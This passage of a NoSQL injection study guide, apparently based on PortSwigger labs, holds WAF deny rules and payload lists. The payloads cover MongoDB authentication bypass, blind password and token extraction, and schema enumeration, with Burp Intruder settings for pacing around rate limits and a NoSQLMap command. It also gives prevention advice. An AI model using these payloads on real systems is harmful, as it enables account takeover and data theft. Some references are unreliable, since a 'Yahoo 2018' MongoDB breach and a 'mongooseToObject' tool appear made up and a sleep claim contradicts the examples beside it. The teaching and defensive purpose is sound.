SecRule REQUEST_BODY "@rx \$where" "id:1002,deny,msg:'NoSQL $where injection attempt'"

# Block Object.keys() attempts
SecRule REQUEST_BODY "@rx Object\.keys" "id:1003,deny,msg:'MongoDB schema enumeration attempt'"

# Block suspicious match() patterns
SecRule REQUEST_BODY "@rx \.match\(['\"]\\^" "id:1004,deny,msg:'NoSQL blind injection pattern'"
```

---

## Attack Techniques Summary

### Syntax Injection

**Concept:** Break out of NoSQL query syntax to inject malicious code.

**Common Characters:**
```
'  "  \  $  {  }  [  ]  ;  ||  &&
```

**Basic Tests:**
```javascript
// Single quote test
Gifts'

// Concatenation test
Gifts'+'

// Boolean manipulation
Gifts'||1||'

// Comment injection
Gifts'//
```

**JavaScript Context:**
```javascript
// Original query
this.category == 'USER_INPUT'

// Injected
this.category == 'Gifts' || 1 || ''  // Always true
```

### Operator Injection

**Concept:** Inject MongoDB query operators to manipulate query logic.

**Authentication Bypass:**
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
```

**Data Extraction:**
```json
{"$where": "this.password.length < 30"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match('^a')"}
```

**Field Discovery:**
```json
{"$where": "Object.keys(this)[0]"}
{"$where": "Object.keys(this).length"}
{"$where": "Object.keys(this).includes('resetToken')"}
```

### Boolean-Based Blind Injection

**Concept:** Extract data by observing true/false responses.

**True/False Tests:**
```javascript
// False condition
admin' && '1'=='2

// True condition
admin' && '1'=='1
```

**Password Length:**
```javascript
admin' && this.password.length == 8 || 'a'=='b
admin' && this.password.length < 30 || 'a'=='b
```

**Character Extraction:**
```javascript
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password[1] == 'b' || 'a'=='b
```

**Regex Extraction:**
```javascript
admin' && this.password.match('^a.*') || 'a'=='b
admin' && this.password.match('^.{2}c') || 'a'=='b
```

### Schema Enumeration

**Field Names:**
```javascript
// Get field count
Object.keys(this).length

// Get specific field name
Object.keys(this)[0]
Object.keys(this)[1]

// Check field existence
'resetToken' in this
this.hasOwnProperty('resetToken')
```

**Field Types:**
```javascript
typeof this.resetToken === 'string'
Array.isArray(this.roles)
this.age instanceof Number
```

**Field Values:**
```javascript
this.resetToken.length
this.roles.includes('admin')
Object.values(this)[3]
```

### Time-Based Injection

**Concept:** Use delays to infer information (less common in MongoDB).

**Sleep Injection:**
```javascript
// Using $where with sleep
{"$where": "sleep(5000) || true"}

// Conditional sleep
{"$where": "this.password[0]=='a' ? sleep(5000) : true"}
```

**Note:** MongoDB doesn't have a built-in sleep function. Time-based attacks are more common in SQL databases.

---

## MongoDB Operators Reference

### Comparison Operators

| Operator | Description | Example | Use Case |
|----------|-------------|---------|----------|
| `$eq` | Equal | `{age: {$eq: 25}}` | Match specific value |
| `$ne` | Not equal | `{password: {$ne: ""}}` | Bypass authentication |
| `$gt` | Greater than | `{age: {$gt: 18}}` | Bypass checks |
| `$gte` | Greater than or equal | `{age: {$gte: 18}}` | Bypass checks |
| `$lt` | Less than | `{price: {$lt: 100}}` | Manipulate queries |
| `$lte` | Less than or equal | `{price: {$lte: 100}}` | Manipulate queries |
| `$in` | In array | `{role: {$in: ["admin", "user"]}}` | Multiple value match |
| `$nin` | Not in array | `{status: {$nin: ["banned"]}}` | Exclude values |

### Logical Operators

| Operator | Description | Example | Use Case |
|----------|-------------|---------|----------|
| `$and` | Logical AND | `{$and: [{age: {$gt: 18}}, {status: "active"}]}` | Combine conditions |
| `$or` | Logical OR | `{$or: [{role: "admin"}, {role: "moderator"}]}` | Alternative conditions |
| `$not` | Logical NOT | `{age: {$not: {$lt: 18}}}` | Negate condition |
| `$nor` | Logical NOR | `{$nor: [{status: "banned"}, {status: "deleted"}]}` | Neither condition |

### Element Operators

| Operator | Description | Example | Use Case |
|----------|-------------|---------|----------|
| `$exists` | Field exists | `{email: {$exists: true}}` | Check field presence |
| `$type` | Field type | `{age: {$type: "number"}}` | Validate data type |

### Evaluation Operators

| Operator | Description | Example | Use Case |
|----------|-------------|---------|----------|
| `$regex` | Regular expression | `{name: {$regex: "^John"}}` | Pattern matching |
| `$where` | JavaScript | `{$where: "this.age > 18"}` | Complex conditions (DANGEROUS) |
| `$expr` | Expression | `{$expr: {$gt: ["$spent", "$budget"]}}` | Compare fields |
| `$mod` | Modulo | `{age: {$mod: [2, 0]}}` | Even/odd checks |

### Array Operators

| Operator | Description | Example | Use Case |
|----------|-------------|---------|----------|
| `$all` | All match | `{tags: {$all: ["red", "blank"]}}` | Multiple values |
| `$elemMatch` | Element matches | `{results: {$elemMatch: {$gte: 80, $lt: 90}}}` | Array element condition |
| `$size` | Array size | `{tags: {$size: 3}}` | Array length |

### Dangerous Operators for Injection

**High Risk:**
- `$where` - Executes JavaScript (RCE potential)
- `$regex` - Pattern matching (blind injection)
- `$expr` - Expression evaluation (logic manipulation)

**Medium Risk:**
- `$ne` - Not equal (authentication bypass)
- `$gt`, `$gte`, `$lt`, `$lte` - Comparison (auth bypass)
- `$in`, `$nin` - Array membership (auth bypass)

**Low Risk (but useful):**
- `$exists` - Field existence (reconnaissance)
- `$type` - Type checking (reconnaissance)

---

## Burp Suite Configuration

### Intruder Attack Types

**Sniper:**
- Use: Single parameter testing
- Positions: 1
- Example: Test password characters sequentially

**Battering Ram:**
- Use: Same payload in all positions
- Positions: Multiple
- Example: Test same value across different fields

**Pitchfork:**
- Use: Parallel iteration
- Positions: Multiple
- Payloads: One set per position
- Example: Test specific character at specific position

**Cluster Bomb:**
- Use: All combinations
- Positions: Multiple
- Payloads: One set per position
- Example: Extract password (position × character)

### Grep Match Configuration

1. **Intruder → Options → Grep - Match**
2. **Click "Add"**
3. **Enter match string:**
   - Success indicators: "Your username is:", "Account locked"
   - Failure indicators: "Could not find user", "Invalid"
4. **Case sensitive:** Usually unchecked
5. **Use in results:** Checked responses indicate matches

### Resource Pool Settings

**For Time-Sensitive Attacks:**
1. **Intruder → Resource Pool tab**
2. **Create new resource pool**
3. **Maximum concurrent requests:** 1
4. **Delay between requests:** 100-500ms
5. **Why:** Prevents interference and rate limiting

**For Fast Enumeration:**
1. **Maximum concurrent requests:** 10-20
2. **No delay**
3. **Use:** Field discovery, character extraction

### Payload Processing

**URL Encoding:**
1. **Payload Processing → Add**
2. **Rule type:** URL-encode all characters
3. **When:** Special characters in payload

**Case Modification:**
1. **Rule type:** Change case
2. **Options:** Uppercase, Lowercase
3. **When:** Testing case sensitivity

**Matching/Replacing:**
1. **Rule type:** Match/Replace
2. **Use:** Transform payloads dynamically

---

## Common Mistakes & Troubleshooting

### Issue: Payloads Don't Work

**URL Encoding Problems:**
```
❌ Wrong: Gifts'||1||'
✅ Right: Gifts'%7c%7c1%7c%7c'

❌ Wrong: admin' && '1'=='1
✅ Right: admin'%20%26%26%20'1'%3d%3d'1
```

**Solution:**
- Use Burp's URL encoding feature
- Decoder tab: Encode as → URL
- Or Repeater: Ctrl+U to URL encode selection

### Issue: JSON Injection Not Recognized

**Content-Type Header:**
```
❌ Wrong: Content-Type: application/x-www-form-urlencoded
✅ Right: Content-Type: application/json
```

**JSON Syntax:**
```json
❌ Wrong: {"username": "admin", "password": {$ne: ""}}
✅ Right: {"username": "admin", "password": {"$ne": ""}}
```

**Solution:**
- Always use proper JSON syntax
- Validate JSON with online validators
- Check Content-Type header

### Issue: Boolean Injection Gives Inconsistent Results

**Incomplete Injection:**
```javascript
❌ Wrong: admin' && this.password[0]=='a'
// Results in: this.username == 'admin' && this.password[0]=='a''
// Syntax error due to trailing quote

✅ Right: admin' && this.password[0]=='a' || 'x'=='y
// Results in: this.username == 'admin' && this.password[0]=='a' || 'x'=='y'
// Proper closure
```

**Solution:**
- Always close strings properly
- Test with simple true/false conditions first
- Add closing logic: `|| 'a'=='b`

### Issue: Intruder Shows No Clear Matches

**Response Length Analysis:**
- Sort by "Length" column
- Look for outliers (significantly different lengths)
- Successful matches are usually longer (user data displayed)

**Grep Match Not Configured:**
- Add Grep - Match string
- Use specific strings from successful responses
- Multiple grep patterns for better accuracy

**Wrong Attack Type:**
- Use Cluster bomb for position × character
- Use Sniper for single parameter testing
- Pitchfork for parallel iteration

### Issue: Rate Limiting or Lockouts

**Too Many Requests:**
```
HTTP 429 Too Many Requests
or
"Account temporarily locked"
```

**Solution:**
- Configure resource pool: 1 concurrent request
- Add delays: 500-1000ms between requests
- Use multiple test accounts
- Space out attack sessions

### Issue: Can't Extract Full Token/Password

**Incomplete Character Set:**
```python
❌ Limited: a-z only
✅ Complete: a-z, A-Z, 0-9, special characters
```

**Wrong Length:**
- Determine length first: `this.password.length`
- Adjust Intruder payload range accordingly
- Some tokens are 32+ characters (SHA256 hashes)

**Solution:**
- Expand character set progressively
- Check exact length before extraction
- Use hex charset for tokens: a-f, 0-9

---

## References for Mastering NoSQL Injection

### OWASP Documentation

**OWASP Web Security Testing Guide (WSTG):**
- **URL:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- **Content:** Testing methodologies, detection techniques, exploitation examples
- **Key Topics:** MongoDB injection, CouchDB injection, testing procedures

**OWASP Cheat Sheet Series - NoSQL Security:**
- **URL:** https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html
- **Content:** Prevention techniques, secure coding practices, input validation
- **Key Topics:** Operator filtering, parameterized queries, input sanitization

**OWASP NodeGoat Tutorial:**
- **URL:** https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_sql_and_nosql_injection.html
- **Content:** Practical Node.js + MongoDB injection examples
- **Key Topics:** Vulnerable code patterns, secure alternatives, hands-on exercises

**OWASP Top 10:2025 - A05 Injection:**
- **URL:** https://owasp.org/Top10/2025/A05_2025-Injection/
- **Content:** Injection vulnerabilities including NoSQL
- **Key Topics:** Risk assessment, prevention, detection

### Industry Standard Guidelines

**PortSwigger Web Security Academy:**
- **URL:** https://portswigger.net/web-security/nosql-injection
- **Content:** Comprehensive NoSQL injection tutorial
- **Key Topics:** Syntax injection, operator injection, exploitation techniques
- **Labs:** 4 interactive labs covering detection, bypass, and data extraction

**Imperva Learning Center:**
- **URL:** https://www.imperva.com/learn/application-security/nosql-injection/
- **Content:** NoSQL injection overview and real-world examples
- **Key Topics:** Attack vectors, impact analysis, MongoDB-specific techniques

**HackTricks - NoSQL Injection:**
- **URL:** https://book.hacktricks.xyz/pentesting-web/nosql-injection
- **Content:** Detailed exploitation techniques and payloads
- **Key Topics:** MongoDB, CouchDB, Cassandra injection methods

**Acunetix Blog:**
- **URL:** https://www.acunetix.com/blog/web-security-zone/nosql-injections/
- **Content:** NoSQL injection prevention and testing
- **Key Topics:** Vulnerability assessment, mitigation strategies

**Bright Security (formerly NeuraLegion):**
- **URL:** https://brightsec.com/blog/nosql-injection-explained-what-it-is-and-how-to-prevent-it/
- **Content:** NoSQL injection explanation and prevention
- **Key Topics:** MongoDB SQL injection, secure coding practices

### CVE Examples and Advisories

**CVE-2025-23061 - Mongoose RCE:**
- **Product:** Mongoose ≤ 8.8.2
- **Vulnerability:** $where operator execution despite server-side JS disabled
- **Impact:** Remote code execution through populate() method
- **Lesson:** Even with MongoDB restrictions, application-level vulnerabilities exist

**CVE-2023-28359 - Rocket.Chat:**
- **Product:** Rocket.Chat ≤ 6.0.0
- **Vulnerability:** Unauthenticated NoSQL injection via Meteor method
- **Impact:** Data exfiltration of 11 million user records
- **Lesson:** Selector objects must be sanitized before database queries

**Yahoo Data Breach (2018):**
- **Impact:** 11 million user records stolen
- **Database:** MongoDB
- **Attack:** NoSQL injection combined with other vulnerabilities
- **Lesson:** Defense in depth required, not just input validation

**Research Paper - MongoDB Injection Dataset:**
- **URL:** https://pmc.ncbi.nlm.nih.gov/articles/PMC10997947/
- **Content:** Comprehensive collection of MongoDB injection attempts
- **Key Topics:** Attack patterns, vulnerability analysis, dataset for ML models

### Tools and Frameworks for Testing

**NoSQLMap:**
- **URL:** https://github.com/codingo/NoSQLMap
- **Description:** Automated NoSQL injection tool
- **Features:** MongoDB, CouchDB, Redis support, automated exploitation
- **Usage:**
  ```bash
  python nosqlmap.py -u "http://target.com/login" -p username,password --attack=1
  ```

**Burp Suite (Professional/Community):**
- **URL:** https://portswigger.net/burp
- **Features:** Manual testing, Intruder for automation, Repeater for payload testing
- **Extensions:** NoSQLi Scanner, JSON beautifier

**NoSQL-Exploitation-Framework:**
- **URL:** https://github.com/torque59/Nosql-Exploitation-Framework
- **Description:** Framework for testing NoSQL databases
- **Features:** Automated injection, payload generation, report generation

**mongo-sanitize (npm):**
- **URL:** https://www.npmjs.com/package/mongo-sanitize
- **Description:** Sanitize MongoDB queries in Node.js
- **Usage:**
  ```javascript
  const sanitize = require('mongo-sanitize');
  const username = sanitize(req.body.username);
  ```

**mongooseToObject:**
- **URL:** Part of Mongoose ODM
- **Description:** Safely convert user input to MongoDB queries
- **Usage:**
  ```javascript
  const query = mongoose.model('User').find({username: req.body.username});
  ```

**OWASP ZAP:**
- **URL:** https://www.zaproxy.org/
- **Features:** Automated vulnerability scanning, NoSQL injection detection
- **Usage:** Free, open-source alternative to Burp Suite

### Research Papers and Technical Articles

**"NoSQL Injection: Risks, Mechanisms & Prevention":**
- **Source:** Indusface
- **URL:** https://www.indusface.com/learning/nosql-injection/
- **Topics:** Risk assessment, attack mechanisms, defensive strategies

**"Pentesting Your Database: NoSQL Injection Prevention":**
- **Source:** Pentest Wizard
- **URL:** https://pentestwizard.com/pentesting-databases-nosql-injection-prevention/
- **Topics:** Testing methodologies, prevention techniques, best practices

**"Preventing NoSQL Injection Attacks: Best Practices":**
- **Source:** Cybersecurity Decoder
- **URL:** https://cybersecuritydecoder.com/threats/sql-injection/preventing-nosql-injection-attacks-best-practices-1159/
- **Topics:** Input validation, parameterized queries, WAF configuration

**Medium Walkthroughs:**
- "PortSwigger Web Academy: Detecting NoSQL Injection Lab" by Alex Rodriguez
- "NoSQL Injection — PortSwigger" by Abdul Wassay
- "PortSwigger Lab — NoSQL Injection" by k1dd0sz

### Secure Coding Best Practices

**MongoDB Security Manual:**
- **URL:** https://docs.mongodb.com/manual/security/
- **Topics:** Authentication, authorization, encryption, auditing
- **Key:** Disable server-side JavaScript with `--noscripting`

**Mongoose Security Best Practices:**
- **URL:** https://mongoosejs.com/docs/tutorials/sanitize-inputs.html
- **Topics:** Input sanitization, schema validation, query building
- **Key:** Use schema definitions and validation middleware

**OWASP Secure Coding Practices:**
- **URL:** https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/
- **Topics:** Input validation, output encoding, parameterized queries
- **Key:** Never trust user input, validate everything

**Node.js Security Checklist:**
- **URL:** https://nodejs.org/en/docs/guides/security/
- **Topics:** Dependency management, input validation, secure defaults
- **Key:** Regular updates, security-focused development

**MongoDB Atlas Security Features:**
- **URL:** https://www.mongodb.com/cloud/atlas/security
- **Features:** Built-in encryption, network isolation, audit logs
- **Key:** Cloud-native security controls

### Community and Forums

**Stack Overflow:**
- **Tag:** [mongodb-injection]
- **URL:** https://stackoverflow.com/questions/tagged/mongodb-injection
- **Content:** Q&A on NoSQL injection issues and solutions

**Reddit:**
- **r/netsec** - Network security and penetration testing
- **r/websecurity** - Web application security
- **r/mongodb** - MongoDB-specific discussions

**MongoDB Community Forums:**
- **URL:** https://www.mongodb.com/community/forums/
- **Content:** Security discussions, best practices, troubleshooting

**OWASP Slack:**
- **URL:** https://owasp.org/slack/invite
- **Channels:** #appsec, #testing, #coders
- **Content:** Real-time discussions with security professionals

---

## Quick Reference Guide

### Testing Checklist

- [ ] Identify NoSQL database (MongoDB, CouchDB, etc.)
- [ ] Test for syntax injection (', ", $, {, })
- [ ] Test for operator injection ($ne, $gt, $regex)
- [ ] Test for JavaScript injection ($where)
- [ ] Enumerate field names (Object.keys())
- [ ] Extract sensitive data (passwords, tokens)
- [ ] Test authentication bypass
- [ ] Document all findings
- [ ] Verify remediation

### Quick Payloads

**Detection:**
```
'
'+'
'||1||'
{"$ne": ""}
{"$where": "1"}
```

**Authentication Bypass:**
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
```

**Data Extraction:**
```javascript
admin' && this.password[0]=='a' || 'x'=='y
{"$where": "this.password.match('^a')"}
```

**Field Enumeration:**
```json
{"$where": "Object.keys(this)[1].match('^u')"}
```

### Error Messages

**MongoDB:**
```
SyntaxError: unterminated string literal
ReferenceError: X is not defined
TypeError: Cannot read property 'X' of undefined
```

**Express/Node.js:**
```
MongoError: $where is not allowed
CastError: Cast to string failed
ValidationError: Path `username` is required
```

---

## Conclusion

NoSQL injection vulnerabilities remain a critical security risk in modern web applications. Success requires:

**For Penetration Testers:**
- Understanding of NoSQL query structures
- Knowledge of MongoDB operators
- Boolean-based blind injection techniques
- Burp Suite proficiency
- Patience for character-by-character extraction

**For Developers:**
- Never concatenate user input into queries
- Use parameterized queries and ODM/ORM frameworks
- Validate and sanitize all input
- Disable JavaScript execution in MongoDB ($where)
- Implement proper input type checking

**For Security Teams:**
- Deploy WAF rules to block operator injection
- Monitor for suspicious query patterns
- Regular security assessments
- Security awareness training
- Incident response procedures

**Key Takeaway:** The best defense is input validation combined with parameterized queries. Treat ALL user input as untrusted, even data retrieved from the database.

---

**Document Version:** 1.0
**Last Updated:** 2026-01-11
**Author:** Security Research Team
**Lab Source:** PortSwigger Web Security Academy
